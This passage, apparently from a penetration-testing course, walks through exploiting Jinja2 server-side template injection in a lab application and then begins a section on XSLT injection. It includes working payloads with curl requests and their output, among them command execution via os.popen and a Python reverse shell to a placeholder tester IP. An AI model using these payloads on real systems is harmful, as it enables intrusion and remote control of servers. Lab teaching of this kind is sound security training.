&#39;itertools._grouper&#39;&gt;, &lt;class &#39;itertools._tee&#39;&gt;, &lt;class &#39;itertools._tee_dataobject&#39;&gt;, &lt;class &#39;reprlib.Repr&#39;&gt;, &lt;class &#39;collections.deque&#39;&gt;, &lt;class &#39;_collections._deque_iterator&#39;&gt;, &lt;class &#39;_collections._deque_reverse_iterator&#39;&gt;, &lt;class &#39;_collections._tuplegetter&#39;&gt;, &lt;class &#39;collections._Link&#39;&gt;, &lt;class &#39;functools.partial&#39;&gt;, &lt;class &#39;functools._lru_cache_wrapper&#39;&gt;, &lt;class &#39;functools.partialmethod&#39;&gt;, &lt;class &#39;functools.singledispatchmethod&#39;&gt;, &lt;class &#39;functools.cached_property&#39;&gt;, &lt;class &#39;types.DynamicClassAttribute&#39;&gt;, &lt;class &#39;types._GeneratorWrapper&#39;&gt;, &lt;class &#39;enum.auto&#39;&gt;, &lt;enum &#39;Enum&#39;&gt;, &lt;class &#39;re.Pattern&#39;&gt;, &lt;class &#39;re.Match&#39;&gt;, &lt;class &#39;_sre.SRE_Scanner&#39;&gt;, &lt;class &#39;sre_parse.State&#39;&gt;, &lt;class &#39;sre_parse.SubPattern&#39;&gt;, &lt;class &#39;sre_parse.Tokenizer&#39;&gt;, &lt;class &#39;re.Scanner&#39;&gt;, &lt;class &#39;string.Template&#39;&gt;, &lt;class &#39;string.Formatter&#39;&gt;, &lt;class &#39;contextlib.ContextDecorator&#39;&gt;, &lt;class &#39;contextlib._GeneratorContextManagerBase&#39;&gt;, &lt;class &#39;contextlib._BaseExitStack&#39;&gt;, &lt;class &#39;typing._Final&#39;&gt;, &lt;class &#39;typing._Immutable&#39;&gt;, &lt;class &#39;typing.Generic&#39;&gt;, &lt;class &#39;typing._TypingEmpty&#39;&gt;, &lt;class &#39;typing._TypingEllipsis&#39;&gt;, &lt;class &#39;typing.NamedTuple&#39;&gt;, &lt;class &#39;typing.io&#39;&gt;, &lt;class &#39;typing.re&#39;&gt;, &lt;class &#39;_ast.AST&#39;&gt;, &lt;class &#39;markupsafe._MarkupEscapeHelper&#39;&gt;, &lt;class &#39;select.poll&#39;&gt;, &lt;class &#39;select.epoll&#39;&gt;, &lt;class &#39;selectors.BaseSelector&#39;&gt;, &lt;class &#39;_socket.socket&#39;&gt;, &lt;class &#39;_weakrefset._IterationGuard&#39;&gt;, &lt;class &#39;_weakrefset.WeakSet&#39;&gt;, &lt;class &#39;threading._RLock&#39;&gt;, &lt;class &#39;threading.Condition&#39;&gt;, &lt;class &#39;threading.Semaphore&#39;&gt;, &lt;class &#39;threading.Event&#39;&gt;, &lt;class &#39;threading.Barrier&#39;&gt;, &lt;class &#39;threading.Thread&#39;&gt;, &lt;class &#39;socketserver.BaseServer&#39;&gt;, &lt;class &#39;socketserver.ForkingMixIn&#39;&gt;, &lt;class &#39;socketserver._NoThreads&#39;&gt;, &lt;class &#39;socketserver.ThreadingMixIn&#39;&gt;, &lt;class &#39;socketserver.BaseRequestHandler&#39;&gt;, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &lt;class &#39;datetime.date&#39;&gt;, &lt;class &#39;datetime.timedelta&#39;&gt;, &lt;class &#39;datetime.time&#39;&gt;, &lt;class &#39;datetime.tzinfo&#39;&gt;, &lt;class &#39;weakref.finalize._Info&#39;&gt;, &lt;class &#39;weakref.finalize&#39;&gt;, &lt;class &#39;_sha512.sha384&#39;&gt;, &lt;class &#39;_sha512.sha512&#39;&gt;, &lt;class &#39;_random.Random&#39;&gt;, &lt;class &#39;urllib.parse._ResultMixinStr&#39;&gt;, &lt;class &#39;urllib.parse._ResultMixinBytes&#39;&gt;, &lt;class &#39;urllib.parse._NetlocResultMixinBase&#39;&gt;, &lt;class &#39;calendar._localized_month&#39;&gt;, &lt;class &#39;calendar._localized_day&#39;&gt;, &lt;class &#39;calendar.Calendar&#39;&gt;, &lt;class &#39;calendar.different_locale&#39;&gt;, &lt;class &#39;email._parseaddr.AddrlistClass&#39;&gt;, &lt;class &#39;Struct&#39;&gt;, &lt;class &#39;unpack_iterator&#39;&gt;, &lt;class &#39;email.charset.Charset&#39;&gt;, &lt;class &#39;email.header.Header&#39;&gt;, &lt;class &#39;email.header._ValueFormatter&#39;&gt;, &lt;class &#39;email._policybase._PolicyBase&#39;&gt;, &lt;class &#39;email.feedparser.BufferedSubFile&#39;&gt;, &lt;class &#39;email.feedparser.FeedParser&#39;&gt;, &lt;class &#39;email.parser.Parser&#39;&gt;, &lt;class &#39;email.parser.BytesParser&#39;&gt;, &lt;class &#39;email.message.Message&#39;&gt;, &lt;class &#39;http.client.HTTPConnection&#39;&gt;, &lt;class &#39;_ssl._SSLContext&#39;&gt;, &lt;class &#39;_ssl._SSLSocket&#39;&gt;, &lt;class &#39;_ssl.MemoryBIO&#39;&gt;, &lt;class &#39;_ssl.Session&#39;&gt;, &lt;class &#39;ssl.SSLObject&#39;&gt;, &lt;class &#39;mimetypes.MimeTypes&#39;&gt;, &lt;class &#39;zlib.Compress&#39;&gt;, &lt;class &#39;zlib.Decompress&#39;&gt;, &lt;class &#39;_bz2.BZ2Compressor&#39;&gt;, &lt;class &#39;_bz2.BZ2Decompressor&#39;&gt;, &lt;class &#39;_lzma.LZMACompressor&#39;&gt;, &lt;class &#39;_lzma.LZMADecompressor&#39;&gt;, &lt;class &#39;dis.Bytecode&#39;&gt;, &lt;class &#39;tokenize.Untokenizer&#39;&gt;, &lt;class &#39;inspect.BlockFinder&#39;&gt;, &lt;class &#39;inspect._void&#39;&gt;, &lt;class &#39;inspect._empty&#39;&gt;, &lt;class &#39;inspect.Parameter&#39;&gt;, &lt;class &#39;inspect.BoundArguments&#39;&gt;, &lt;class &#39;inspect.Signature&#39;&gt;, &lt;class &#39;traceback.FrameSummary&#39;&gt;, &lt;class &#39;traceback.TracebackException&#39;&gt;, &lt;class &#39;logging.LogRecord&#39;&gt;, &lt;class &#39;logging.PercentStyle&#39;&gt;, &lt;class &#39;logging.Formatter&#39;&gt;, &lt;class &#39;logging.BufferingFormatter&#39;&gt;, &lt;class &#39;logging.Filter&#39;&gt;, &lt;class &#39;logging.Filterer&#39;&gt;, &lt;class &#39;logging.PlaceHolder&#39;&gt;, &lt;class {{ ''.__class__.__mro__ }}
&#39;logging.Manager&#39;&gt;, &lt;class &#39;logging.LoggerAdapter&#39;&gt;, &lt;class &#39;werkzeug._internal._Missing&#39;&gt;, &lt;class &#39;werkzeug.exceptions.Aborter&#39;&gt;, &lt;class &#39;werkzeug.urls.Href&#39;&gt;, &lt;class &#39;subprocess.CompletedProcess&#39;&gt;, &lt;class &#39;subprocess.Popen&#39;&gt;, &lt;class &#39;_hashlib.HASH&#39;&gt;, &lt;class &#39;_blake2.blake2b&#39;&gt;, &lt;class &#39;_blake2.blake2s&#39;&gt;, &lt;class &#39;_sha3.sha3_224&#39;&gt;, &lt;class &#39;_sha3.sha3_256&#39;&gt;, &lt;class &#39;_sha3.sha3_384&#39;&gt;, &lt;class &#39;_sha3.sha3_512&#39;&gt;, &lt;class &#39;_sha3.shake_128&#39;&gt;, &lt;class &#39;_sha3.shake_256&#39;&gt;, &lt;class &#39;tempfile._RandomNameSequence&#39;&gt;, &lt;class &#39;tempfile._TemporaryFileCloser&#39;&gt;, &lt;class &#39;tempfile._TemporaryFileWrapper&#39;&gt;, &lt;class &#39;tempfile.SpooledTemporaryFile&#39;&gt;, &lt;class &#39;tempfile.TemporaryDirectory&#39;&gt;, &lt;class &#39;urllib.request.Request&#39;&gt;, &lt;class &#39;urllib.request.OpenerDirector&#39;&gt;, &lt;class &#39;urllib.request.BaseHandler&#39;&gt;, &lt;class &#39;urllib.request.HTTPPasswordMgr&#39;&gt;, &lt;class &#39;urllib.request.AbstractBasicAuthHandler&#39;&gt;, &lt;class &#39;urllib.request.AbstractDigestAuthHandler&#39;&gt;, &lt;class &#39;urllib.request.URLopener&#39;&gt;, &lt;class &#39;urllib.request.ftpwrapper&#39;&gt;, &lt;class &#39;http.cookiejar.Cookie&#39;&gt;, &lt;class &#39;http.cookiejar.CookiePolicy&#39;&gt;, &lt;class &#39;http.cookiejar.Absent&#39;&gt;, &lt;class &#39;http.cookiejar.CookieJar&#39;&gt;, &lt;class &#39;werkzeug.datastructures.ImmutableListMixin&#39;&gt;, &lt;class &#39;werkzeug.datastructures.ImmutableDictMixin&#39;&gt;, &lt;class &#39;werkzeug.datastructures._omd_bucket&#39;&gt;, &lt;class &#39;werkzeug.datastructures.Headers&#39;&gt;, &lt;class &#39;werkzeug.datastructures.ImmutableHeadersMixin&#39;&gt;, &lt;class &#39;werkzeug.datastructures.IfRange&#39;&gt;, &lt;class &#39;werkzeug.datastructures.Range&#39;&gt;, &lt;class &#39;werkzeug.datastructures.ContentRange&#39;&gt;, &lt;class &#39;werkzeug.datastructures.FileStorage&#39;&gt;, &lt;class &#39;dataclasses._HAS_DEFAULT_FACTORY_CLASS&#39;&gt;, &lt;class &#39;dataclasses._MISSING_TYPE&#39;&gt;, &lt;class &#39;dataclasses._FIELD_BASE&#39;&gt;, &lt;class &#39;dataclasses.InitVar&#39;&gt;, &lt;class &#39;dataclasses.Field&#39;&gt;, &lt;class &#39;dataclasses._DataclassParams&#39;&gt;, &lt;class &#39;werkzeug.sansio.multipart.Event&#39;&gt;, &lt;class &#39;werkzeug.sansio.multipart.MultipartDecoder&#39;&gt;, &lt;class &#39;werkzeug.sansio.multipart.MultipartEncoder&#39;&gt;, &lt;class &#39;importlib.abc.Finder&#39;&gt;, &lt;class &#39;importlib.abc.Loader&#39;&gt;, &lt;class &#39;importlib.abc.ResourceReader&#39;&gt;, &lt;class &#39;pkgutil.ImpImporter&#39;&gt;, &lt;class &#39;pkgutil.ImpLoader&#39;&gt;, &lt;class &#39;hmac.HMAC&#39;&gt;, &lt;class &#39;werkzeug.wsgi.ClosingIterator&#39;&gt;, &lt;class &#39;werkzeug.wsgi.FileWrapper&#39;&gt;, &lt;class &#39;werkzeug.wsgi._RangeWrapper&#39;&gt;, &lt;class &#39;werkzeug.utils.HTMLBuilder&#39;&gt;, &lt;class &#39;werkzeug.wrappers.accept.AcceptMixin&#39;&gt;, &lt;class &#39;werkzeug.wrappers.auth.AuthorizationMixin&#39;&gt;, &lt;class &#39;werkzeug.wrappers.auth.WWWAuthenticateMixin&#39;&gt;, &lt;class &#39;_json.Scanner&#39;&gt;, &lt;class &#39;_json.Encoder&#39;&gt;, &lt;class &#39;json.decoder.JSONDecoder&#39;&gt;, &lt;class &#39;json.encoder.JSONEncoder&#39;&gt;, &lt;class &#39;werkzeug.formparser.FormDataParser&#39;&gt;, &lt;class &#39;werkzeug.formparser.MultiPartParser&#39;&gt;, &lt;class &#39;werkzeug.user_agent.UserAgent&#39;&gt;, &lt;class &#39;werkzeug.useragents._UserAgentParser&#39;&gt;, &lt;class &#39;werkzeug.sansio.request.Request&#39;&gt;, &lt;class &#39;werkzeug.wrappers.request.StreamOnlyMixin&#39;&gt;, &lt;class &#39;werkzeug.sansio.response.Response&#39;&gt;, &lt;class &#39;werkzeug.wrappers.response.ResponseStream&#39;&gt;, &lt;class &#39;werkzeug.wrappers.response.ResponseStreamMixin&#39;&gt;, &lt;class &#39;werkzeug.wrappers.common_descriptors.CommonRequestDescriptorsMixin&#39;&gt;, &lt;class &#39;werkzeug.wrappers.common_descriptors.CommonResponseDescriptorsMixin&#39;&gt;, &lt;class &#39;werkzeug.wrappers.etag.ETagRequestMixin&#39;&gt;, &lt;class &#39;werkzeug.wrappers.etag.ETagResponseMixin&#39;&gt;, &lt;class &#39;werkzeug.wrappers.user_agent.UserAgentMixin&#39;&gt;, &lt;class &#39;werkzeug.test._TestCookieHeaders&#39;&gt;, &lt;class &#39;werkzeug.test._TestCookieResponse&#39;&gt;, &lt;class &#39;werkzeug.test.EnvironBuilder&#39;&gt;, &lt;class &#39;werkzeug.test.Client&#39;&gt;, &lt;class &#39;decimal.Decimal&#39;&gt;, &lt;class &#39;decimal.Context&#39;&gt;, &lt;class &#39;decimal.SignalDictMixin&#39;&gt;, &lt;class &#39;decimal.ContextManager&#39;&gt;, &lt;class &#39;numbers.Number&#39;&gt;, &lt;class &#39;uuid.UUID&#39;&gt;, &lt;class &#39;_pickle.Unpickler&#39;&gt;, &lt;class &#39;_pickle.Pickler&#39;&gt;, &lt;class &#39;_pickle.Pdata&#39;&gt;, &lt;class &#39;_pickle.PicklerMemoProxy&#39;&gt;, &lt;class &#39;_pickle.UnpicklerMemoProxy&#39;&gt;, &lt;class &#39;pickle._Framer&#39;&gt;, &lt;class &#39;pickle._Unframer&#39;&gt;, &lt;class &#39;pickle._Pickler&#39;&gt;, &lt;class &#39;pickle._Unpickler&#39;&gt;, &lt;class &#39;jinja2.bccache.Bucket&#39;&gt;, &lt;class &#39;jinja2.bccache.BytecodeCache&#39;&gt;, &lt;class &#39;jinja2.utils.MissingType&#39;&gt;, &lt;class &#39;jinja2.utils.LRUCache&#39;&gt;, &lt;class &#39;jinja2.utils.Cycler&#39;&gt;, &lt;class &#39;jinja2.utils.Joiner&#39;&gt;, &lt;class &#39;jinja2.utils.Namespace&#39;&gt;, &lt;class &#39;jinja2.nodes.EvalContext&#39;&gt;, &lt;class &#39;jinja2.nodes.Node&#39;&gt;, &lt;class &#39;jinja2.visitor.NodeVisitor&#39;&gt;, &lt;class &#39;jinja2.idtracking.Symbols&#39;&gt;, &lt;class &#39;jinja2.compiler.MacroRef&#39;&gt;, &lt;class &#39;jinja2.compiler.Frame&#39;&gt;, &lt;class &#39;jinja2.runtime.TemplateReference&#39;&gt;, &lt;class &#39;jinja2.runtime.Context&#39;&gt;, &lt;class &#39;jinja2.runtime.BlockReference&#39;&gt;, &lt;class &#39;jinja2.runtime.LoopContext&#39;&gt;, &lt;class &#39;jinja2.runtime.Macro&#39;&gt;, &lt;class &#39;jinja2.runtime.Undefined&#39;&gt;, &lt;class &#39;ast.NodeVisitor&#39;&gt;, &lt;class &#39;jinja2.lexer.Failure&#39;&gt;, &lt;class &#39;jinja2.lexer.TokenStreamIterator&#39;&gt;, &lt;class &#39;jinja2.lexer.TokenStream&#39;&gt;, &lt;class &#39;jinja2.lexer.Lexer&#39;&gt;, &lt;class &#39;jinja2.parser.Parser&#39;&gt;, &lt;class &#39;jinja2.environment.Environment&#39;&gt;, &lt;class &#39;jinja2.environment.Template&#39;&gt;, &lt;class &#39;jinja2.environment.TemplateModule&#39;&gt;, &lt;class &#39;jinja2.environment.TemplateExpression&#39;&gt;, &lt;class &#39;jinja2.environment.TemplateStream&#39;&gt;, &lt;class &#39;jinja2.loaders.BaseLoader&#39;&gt;, &lt;class &#39;werkzeug.local.Local&#39;&gt;, &lt;class &#39;werkzeug.local.LocalStack&#39;&gt;, &lt;class &#39;werkzeug.local.LocalManager&#39;&gt;, &lt;class &#39;werkzeug.local._ProxyLookup&#39;&gt;, &lt;class &#39;werkzeug.local.LocalProxy&#39;&gt;, &lt;class &#39;difflib.SequenceMatcher&#39;&gt;, &lt;class &#39;difflib.Differ&#39;&gt;, &lt;class &#39;difflib.HtmlDiff&#39;&gt;, &lt;class &#39;pprint._safe_key&#39;&gt;, &lt;class &#39;pprint.PrettyPrinter&#39;&gt;, &lt;class &#39;werkzeug.routing.RuleFactory&#39;&gt;, &lt;class &#39;werkzeug.routing.RuleTemplate&#39;&gt;, &lt;class &#39;werkzeug.routing.BaseConverter&#39;&gt;, &lt;class &#39;werkzeug.routing.Map&#39;&gt;, &lt;class &#39;werkzeug.routing.MapAdapter&#39;&gt;, &lt;class &#39;gettext.NullTranslations&#39;&gt;, &lt;class &#39;click._compat._FixupStream&#39;&gt;, &lt;class &#39;click._compat._AtomicFile&#39;&gt;, &lt;class &#39;click.utils.LazyFile&#39;&gt;, &lt;class &#39;click.utils.KeepOpenFile&#39;&gt;, &lt;class &#39;click.utils.PacifyFlushWrapper&#39;&gt;, &lt;class &#39;click.types.ParamType&#39;&gt;, &lt;class &#39;click.parser.Option&#39;&gt;, &lt;class &#39;click.parser.Argument&#39;&gt;, &lt;class &#39;click.parser.ParsingState&#39;&gt;, &lt;class &#39;click.parser.OptionParser&#39;&gt;, &lt;class &#39;click.formatting.HelpFormatter&#39;&gt;, &lt;class &#39;click.core.Context&#39;&gt;, &lt;class &#39;click.core.BaseCommand&#39;&gt;, &lt;class &#39;click.core.Parameter&#39;&gt;, &lt;class &#39;flask.signals.Namespace&#39;&gt;, &lt;class &#39;flask.signals._FakeSignal&#39;&gt;, &lt;class &#39;flask.cli.DispatchingApp&#39;&gt;, &lt;class &#39;flask.cli.ScriptInfo&#39;&gt;, &lt;class &#39;flask.config.ConfigAttribute&#39;&gt;, &lt;class &#39;flask.ctx._AppCtxGlobals&#39;&gt;, &lt;class &#39;flask.ctx.AppContext&#39;&gt;, &lt;class &#39;flask.ctx.RequestContext&#39;&gt;, &lt;class &#39;flask.scaffold.Scaffold&#39;&gt;, &lt;class &#39;itsdangerous._json._CompactJSON&#39;&gt;, &lt;class &#39;itsdangerous.signer.SigningAlgorithm&#39;&gt;, &lt;class &#39;itsdangerous.signer.Signer&#39;&gt;, &lt;class &#39;itsdangerous.serializer.Serializer&#39;&gt;, &lt;class &#39;flask.json.tag.JSONTag&#39;&gt;, &lt;class &#39;flask.json.tag.TaggedJSONSerializer&#39;&gt;, &lt;class &#39;flask.sessions.SessionInterface&#39;&gt;, &lt;class &#39;flask.blueprints.BlueprintSetupState&#39;&gt;, &lt;class &#39;unicodedata.UCD&#39;&gt;, &lt;class &#39;__future__._Feature&#39;&gt;]</a>
				<br/>
				<input type="submit" value="execute">
			</form>
		</div>
<SNIP>
</body>
```
Let us print out the number and the method names using the following payload:
```python
{% for i in range(450) %} 
{{ i }}
{{ ''.__class__.__mro__[1].__subclasses__()[i].__name__ }} 
{% endfor %}
```

```
user@htb[/htb]$ curl -gs "http://<TARGET IP>:<PORT>/execute?cmd=%7B%25%20for%20i%20in%20range%28450%29%20%25%7D%20%7B%7B%20i%20%7D%7D%20%7B%7B%20%27%27.__class__.__mro__%5B1%5D.__subclasses__%28%29%5Bi%5D.__name__%20%7D%7D%20%7B%25%20endfor%20%25%7D"

<SNIP>
<body>
	<div id="desktop">
		<div class="window" data-title="Run">
			<form action="/execute" method="get">
				<a>C:\><input type="text" name="cmd" id="command"></a>
				<br/>
				<a> 0 type  1 weakref  2 weakcallableproxy  3 weakproxy  4 int  5 bytearray  6 bytes  7 list  8 NoneType  9 NotImplementedType  10 traceback  11 super  12 range  13 dict  14 dict_keys  15 dict_values  16 dict_items  17 dict_reversekeyiterator  18 dict_reversevalueiterator  19 dict_reverseitemiterator  20 odict_iterator  21 set  22 str  23 slice  24 staticmethod  25 complex  26 float  27 frozenset  28 property  29 managedbuffer  30 memoryview  31 tuple  32 enumerate  33 reversed  34 stderrprinter  35 code  36 frame  37 builtin_function_or_method  38 method  39 function  40 mappingproxy  41 generator  42 getset_descriptor  43 wrapper_descriptor  44 method-wrapper  45 ellipsis  46 member_descriptor  47 SimpleNamespace  48 PyCapsule  49 longrange_iterator  50 cell  51 instancemethod  52 classmethod_descriptor  53 method_descriptor  54 callable_iterator  55 iterator  56 PickleBuffer  57 coroutine  58 coroutine_wrapper  59 InterpreterID  60 EncodingMap  61 fieldnameiterator  62 formatteriterator  63 BaseException  64 hamt  65 hamt_array_node  66 hamt_bitmap_node  67 hamt_collision_node  68 keys  69 values  70 items  71 Context  72 ContextVar  73 Token  74 MISSING  75 moduledef  76 module  77 filter  78 map  79 zip  80 _ModuleLock  81 _DummyModuleLock  82 _ModuleLockManager  83 ModuleSpec  84 BuiltinImporter  85 classmethod  86 FrozenImporter  87 _ImportLockContext  88 _localdummy  89 _local  90 lock  91 RLock  92 _IOBase  93 _BytesIOBuffer  94 IncrementalNewlineDecoder  95 ScandirIterator  96 DirEntry  97 WindowsRegistryFinder  98 _LoaderBasics  99 FileLoader  100 _NamespacePath  101 _NamespaceLoader  102 PathFinder  103 FileFinder  104 zipimporter  105 _ZipImportResourceReader  106 Codec  107 IncrementalEncoder  108 IncrementalDecoder  109 StreamReaderWriter  110 StreamRecoder  111 _abc_data  112 ABC  113 dict_itemiterator  114 Hashable  115 Awaitable  116 AsyncIterable  117 async_generator  118 Iterable  119 bytes_iterator  120 bytearray_iterator  121 dict_keyiterator  122 dict_valueiterator  123 list_iterator  124 list_reverseiterator  125 range_iterator  126 set_iterator  127 str_iterator  128 tuple_iterator  129 Sized  130 Container  131 Callable  132 _wrap_close  133 Quitter  134 _Printer  135 _Helper  136 itemgetter  137 attrgetter  138 methodcaller  139 accumulate  140 combinations  141 combinations_with_replacement  142 cycle  143 dropwhile  144 takewhile  145 islice  146 starmap  147 chain  148 compress  149 filterfalse  150 count  151 zip_longest  152 permutations  153 product  154 repeat  155 groupby  156 _grouper  157 _tee  158 _tee_dataobject  159 Repr  160 deque  161 _deque_iterator  162 _deque_reverse_iterator  163 _tuplegetter  164 _Link  165 partial  166 _lru_cache_wrapper  167 partialmethod  168 singledispatchmethod  169 cached_property  170 DynamicClassAttribute  171 _GeneratorWrapper  172 auto  173 Enum  174 Pattern  175 Match  176 SRE_Scanner  177 State  178 SubPattern  179 Tokenizer  180 Scanner  181 Template  182 Formatter  183 ContextDecorator  184 _GeneratorContextManagerBase  185 _BaseExitStack  186 _Final  187 _Immutable  188 Generic  189 _TypingEmpty  190 _TypingEllipsis  191 NamedTuple  192 typing.io  193 typing.re  194 AST  195 _MarkupEscapeHelper  196 poll  197 epoll  198 BaseSelector  199 socket  200 _IterationGuard  201 WeakSet  202 _RLock  203 Condition  204 Semaphore  205 Event  206 Barrier  207 Thread  208 BaseServer  209 ForkingMixIn  210 _NoThreads  211 ThreadingMixIn  212 BaseRequestHandler  213 WarningMessage  214 catch_warnings  215 date  216 timedelta  217 time  218 tzinfo  219 _Info  220 finalize  221 sha384  222 sha512  223 Random  224 _ResultMixinStr  225 _ResultMixinBytes  226 _NetlocResultMixinBase  227 _localized_month  228 _localized_day  229 Calendar  230 different_locale  231 AddrlistClass  232 Struct  233 unpack_iterator  234 Charset  235 Header  236 _ValueFormatter  237 _PolicyBase  238 BufferedSubFile  239 FeedParser  240 Parser  241 BytesParser  242 Message  243 HTTPConnection  244 _SSLContext  245 _SSLSocket  246 MemoryBIO  247 Session  248 SSLObject  249 MimeTypes  250 Compress  251 Decompress  252 BZ2Compressor  253 BZ2Decompressor  254 LZMACompressor  255 LZMADecompressor  256 Bytecode  257 Untokenizer  258 BlockFinder  259 _void  260 _empty  261 Parameter  262 BoundArguments  263 Signature  264 FrameSummary  265 TracebackException  266 LogRecord  267 PercentStyle  268 Formatter  269 BufferingFormatter  270 Filter  271 Filterer  272 PlaceHolder  273 Manager  274 LoggerAdapter  275 _Missing  276 Aborter  277 Href  278 CompletedProcess  279 Popen  280 HASH  281 blake2b  282 blake2s  283 sha3_224  284 sha3_256  285 sha3_384  286 sha3_512  287 shake_128  288 shake_256  289 _RandomNameSequence  290 _TemporaryFileCloser  291 _TemporaryFileWrapper  292 SpooledTemporaryFile  293 TemporaryDirectory  294 Request  295 OpenerDirector  296 BaseHandler  297 HTTPPasswordMgr  298 AbstractBasicAuthHandler  299 AbstractDigestAuthHandler  300 URLopener  301 ftpwrapper  302 Cookie  303 CookiePolicy  304 Absent  305 CookieJar  306 ImmutableListMixin  307 ImmutableDictMixin  308 _omd_bucket  309 Headers  310 ImmutableHeadersMixin  311 IfRange  312 Range  313 ContentRange  314 FileStorage  315 _HAS_DEFAULT_FACTORY_CLASS  316 _MISSING_TYPE  317 _FIELD_BASE  318 InitVar  319 Field  320 _DataclassParams  321 Event  322 MultipartDecoder  323 MultipartEncoder  324 Finder  325 Loader  326 ResourceReader  327 ImpImporter  328 ImpLoader  329 HMAC  330 ClosingIterator  331 FileWrapper  332 _RangeWrapper  333 HTMLBuilder  334 AcceptMixin  335 AuthorizationMixin  336 WWWAuthenticateMixin  337 Scanner  338 Encoder  339 JSONDecoder  340 JSONEncoder  341 FormDataParser  342 MultiPartParser  343 UserAgent  344 _UserAgentParser  345 Request  346 StreamOnlyMixin  347 Response  348 ResponseStream  349 ResponseStreamMixin  350 CommonRequestDescriptorsMixin  351 CommonResponseDescriptorsMixin  352 ETagRequestMixin  353 ETagResponseMixin  354 UserAgentMixin  355 _TestCookieHeaders  356 _TestCookieResponse  357 EnvironBuilder  358 Client  359 Decimal  360 Context  361 SignalDictMixin  362 ContextManager  363 Number  364 UUID  365 Unpickler  366 Pickler  367 Pdata  368 PicklerMemoProxy  369 UnpicklerMemoProxy  370 _Framer  371 _Unframer  372 _Pickler  373 _Unpickler  374 Bucket  375 BytecodeCache  376 MissingType  377 LRUCache  378 Cycler  379 Joiner  380 Namespace  381 EvalContext  382 Node  383 NodeVisitor  384 Symbols  385 MacroRef  386 Frame  387 TemplateReference  388 Context  389 BlockReference  390 LoopContext  391 Macro  392 Undefined  393 NodeVisitor  394 Failure  395 TokenStreamIterator  396 TokenStream  397 Lexer  398 Parser  399 Environment  400 Template  401 TemplateModule  402 TemplateExpression  403 TemplateStream  404 BaseLoader  405 Local  406 LocalStack  407 LocalManager  408 _ProxyLookup  409 LocalProxy  410 SequenceMatcher  411 Differ  412 HtmlDiff  413 _safe_key  414 PrettyPrinter  415 RuleFactory  416 RuleTemplate  417 BaseConverter  418 Map  419 MapAdapter  420 NullTranslations  421 _FixupStream  422 _AtomicFile  423 LazyFile  424 KeepOpenFile  425 PacifyFlushWrapper  426 ParamType  427 Option  428 Argument  429 ParsingState  430 OptionParser  431 HelpFormatter  432 Context  433 BaseCommand  434 Parameter  435 Namespace  436 _FakeSignal  437 DispatchingApp  438 ScriptInfo  439 ConfigAttribute  440 _AppCtxGlobals  441 AppContext  442 RequestContext  443 Scaffold  444 _CompactJSON  445 SigningAlgorithm  446 Signer  447 Serializer  448 JSONTag  449 TaggedJSONSerializer </a>
				<br/>
				<input type="submit" value="execute">
			</form>
		</div>
<SNIP>
</body>
```
As you can see in the application's response, `catch_warnings` is located at index #214.

We have everything we need to construct an RCE payload, such as the following:
```python
{{''.__class__.__mro__[1].__subclasses__()[214]()._module.__builtins__['__import__']('os').system("touch /tmp/test1") }}
```

```
user@htb[/htb]$ curl -gs "http://<TARGET IP>:<PORT>/execute?cmd=%7B%7B%27%27.__class__.__mro__%5B1%5D.__subclasses__%28%29%5B214%5D%28%29._module.__builtins__%5B%27__import__%27%5D%28%27os%27%29.system%28%22touch%20%2Ftmp%2Ftest1%22%29%20%7D%7D"

<SNIP>
<body>
	<div id="desktop">
		<div class="window" data-title="Run">
			<form action="/execute" method="get">
				<a>C:\><input type="text" name="cmd" id="command"></a>
				<br/>
				<a>0</a>
				<br/>
				<input type="submit" value="execute">
			</form>
		</div>
<SNIP>
</body>
```
The application returns `0` in its response. This is the return of the value of the command we just executed. `0` indicates that the command was executed without errors.

We can identify if `test1` was created using the following payload:
```python
{{''.__class__.__mro__[1].__subclasses__()[214]()._module.__builtins__['__import__']('os').popen('ls /tmp').read()}}
```

```
user@htb[/htb]$ curl -gs "http://<TARGET IP>:<PORT>/execute?cmd=%7B%7B%27%27.__class__.__mro__%5B1%5D.__subclasses__%28%29%5B214%5D%28%29._module.__builtins__%5B%27__import__%27%5D%28%27os%27%29.popen%28%27ls%20%2Ftmp%27%29.read%28%29%7D%7D"

<SNIP>
<body>
	<div id="desktop">
		<div class="window" data-title="Run">
			<form action="/execute" method="get">
				<a>C:\><input type="text" name="cmd" id="command"></a>
				<br/>
				<a>test1
tmpv4tucw2b
</a>
				<br/>
				<input type="submit" value="execute">
			</form>
		</div>
<SNIP>
</body>
```
Now that we have gone through the payload development process, it's worth mentioning that we can use some specific functions to facilitate the exploitation of Jinja2 SSTI vulnerabilities. Those are `request` and `lipsum`. Feel free to submit them to this section's target:
```python
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

```python
{{lipsum.__globals__.os.popen('id').read()}}
```
A reverse shell can also be established through a payload such as the below:
```python
{{''.__class__.__mro__[1].__subclasses__()[214]()._module.__builtins__['__import__']('os').popen('python -c \'socket=__import__("socket");os=__import__("os");pty=__import__("pty");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<PENTESTER_IP>",<PENTESTER_PORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")\'').read()}}
```

# Extensible Stylesheet Language Transformations Server-Side Injections

## Attacking XSLT

Extensible Stylesheet Language Transformations (`XSLT`) is an XML-based language usually used when transforming XML documents into HTML, another XML document, or PDF. Extensible Stylesheet Language Transformations Server-Side Injection can occur when arbitrary XSLT file upload is possible or when an application generates the XSL Transformation’s XML document dynamically using unvalidated input from the user.

Depending on the case, XSLT uses built-in functions and the XPATH language to transform a document either in the browser or the server. Extensible Stylesheet Language Transformations are present in some web applications as standalone functionality, SSI engines, and databases like Oracle. At the time of writing, there are 3 ([1](https://www.w3.org/TR/xslt-10/), [2](https://www.w3.org/TR/xslt20/), [3](https://www.w3.org/TR/xslt-30/)) XSLT versions. Version 1 is the least interesting from an attacker's perspective due to the limited built-in functionality. The most used XSLT-related projects are LibXSLT, Xalan, and Saxon. To exploit XSLT Injections, we need to store malicious tags on the server-side and access that content.

Let us experiment with XSLT by using a combination of Saxon with XSLT Version 2.

First, install the required packages on Pwnbox or a local VM, as follows:
```
user@htb[/htb]$ sudo apt install default-jdk libsaxon-java libsaxonb-java
```
Next, create the following files:
**catalogue.xml**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<catalog>
  <cd>
    <title>Empire Burlesque</title>
    <artist>Bob Dylan</artist>
    <country>USA</country>
    <company>Columbia</company>
    <price>10.90</price>
    <year>1985</year>
  </cd>
  <cd>
